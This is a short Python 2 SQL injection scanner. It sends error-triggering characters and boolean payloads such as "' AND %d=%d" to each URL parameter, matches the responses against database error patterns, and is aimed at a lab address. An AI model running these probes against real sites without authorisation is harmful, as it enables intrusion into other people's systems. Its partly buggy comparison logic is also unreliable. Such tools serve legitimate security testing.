#-*- coding:utf-8 -*-
import requests,re,random
import urlparse
import urllib

'''
error stores
'''
check_result = {

    'isexits':False,

    'payload':[],

    'params':[]
}

'''
payloads
'''
Payload_List = (
    " AND %d=%d",
    " OR NOT (%d=%d)",
    "' AND %d=%d",
    "' OR NOT (%d=%d)",
    " OR %d=%d")

'''
error match 
'''
DBMS_ERRORS = {
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
    "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
    "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
    "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
    "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
}


'''
detection logic
'''
def check(url):#sqlcheck
    try:
        if(not url.find("?")):
            return False
        _url = url + "%29%28%22%27" #先用)("'使报错
        _content = requests.get(_url).text
        for (dbms, regex) in ((dbms, regex) for dbms in DBMS_ERRORS for regex in DBMS_ERRORS[dbms]):
            if(re.search(regex,_content)):
                print("sql inject found")
                return True
        content = {}
        content["origin"] = requests.get(url).text
        if '&' not in url:
            for payload in Payload_List:
                RANDINT = random.randint(1, 255)
                bol_url=url+payload%(RANDINT,RANDINT)
                content['true']=requests.get(bol_url)
                bol_url=url+payload%(RANDINT,RANDINT+1)
                content['false']=requests.get(bol_url)
                if content['origin']==content["true"]!=content["false"]:
                    print("==sql found！==")
                else:
                    print("not found")
        url=urllib.unquote(url)
        parseresult=urlparse.urlsplit(url)
        scheme=parseresult[0]
        netloc=parseresult[1]
        path=parseresult[2]
        params=parseresult[3]
        paramList = params.split('&')
        for i in range(len(paramList)):
            for payload in Payload_List:
                tmp=str(paramList[i])
                paramList[i]=paramList[i]+payload
                newparams='&'.join(paramList)
                item=scheme+"://"+netloc+path+"?"+newparams
                paramList[i]=tmp
                RANDINT = random.randint(1, 255)
                testurl1 = item%(RANDINT,RANDINT)
                content["true"] = requests.get(testurl1).text
                testurl2 = item%(RANDINT,RANDINT+1)
                content["false"] = requests.get(testurl2).text
                if content['origin']==content["true"]!=content["false"]:
                    check_result['isexits']=True
                    check_result['payload'].append(testurl1)
                    check_result['params'].append(tmp)
                else:
                    pass
        return check_result['isexits']
    except:
        return check_result['isexits']
    return check_result['isexits']
if __name__ == '__main__':
    check('http://192.168.30.131/sqli_test1.php?id=1&uid=test1&uname=test')